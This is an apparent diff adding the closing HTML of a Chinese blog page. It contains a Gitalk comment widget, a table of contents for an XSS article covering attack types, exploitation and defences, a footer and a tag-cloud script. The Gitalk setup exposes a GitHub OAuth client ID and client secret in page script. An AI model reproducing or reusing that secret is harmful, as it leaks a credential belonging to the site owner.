+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+    var pathArr = location.pathname.split("/");
+    var pathId = pathArr[pathArr.length-1];
+    var gitalk = new Gitalk({
+        // Gitalk配置
+        language: "zh-CN",
+        clientID: "7f009ecacf6f9ef23c4f",
+        clientSecret: "37f121ac84806a529cfb6f410e86b869384ecc56",
+        repo: "youhunwl.github.io",
+        owner: "youhunwl",
+        admin: ["youhunwl"],
+        id: md5(location.pathname),
+        distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+</script>
+
+
+    </div>
+
+
+
+
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">文章目录</h3>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是XSS"><span class="toc-text">什么是XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS分类"><span class="toc-text">XSS分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型XSS"><span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS"><span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-XSS"><span class="toc-text">DOM XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS漏洞利用"><span class="toc-text">XSS漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie劫持"><span class="toc-text">Cookie劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造GET与POST请求"><span class="toc-text">构造GET与POST请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#钓鱼"><span class="toc-text">钓鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#识别浏览器及插件"><span class="toc-text">识别浏览器及插件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS防御"><span class="toc-text">XSS防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpOnly"><span class="toc-text">HttpOnly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输入检查"><span class="toc-text">输入检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输出检查"><span class="toc-text">输出检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内容安全策略（CSP）"><span class="toc-text">内容安全策略（CSP）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#案例"><span class="toc-text">案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss在线攻击小游戏"><span class="toc-text">xss在线攻击小游戏</span></a></li></ol>
+        
+    </div>
+</aside>
+
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+
+<a id="back-to-top" class="icon-btn hide">
+	<i class="fa fa-chevron-up"></i>
+</a>
+
+
+
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+</div>
+
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy; 2017 - 2022
+                </span> |
+                <span>
+            		<a href="//www.shen.ee" class="copyright-links" target="_blank">游魂的网络日志</a>
+        	</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+    <script src="/assets/tagcanvas.min.js?rev=2.9"></script>
+    <script>
+        var tagOption = {
+            textColour: '#444', // 字体颜色
+            outlineMethod: 'block', // 选中模式
+            outlineColour: '#FFDAB9', // 选中模式的颜色
+            interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+            textHeight: 13,
+            outlineRadius: 3,
+            freezeActive: true || '', // 选中的标签是否继续滚动
+            frontSelect: true || '', // 不选标签云后部的标签
+            initial: [0.1, -0.1],
+            depth: 0.5,
+            decel: 0.95,
+            maxSpeed: 0.03,
+            reverse: true || '', // 是否反向触发
+            fadeIn: 500, // 进入动画时间
+            wheelZoom: false || '' // 是否启用鼠标滚轮
+        }
+        TagCanvas.Start('tag-cloud-3d','',tagOption);
+    </script>
+
+
+
+
+<script src="/js/app.js?rev=@@hash"></script>
+
+</body>
+</html>
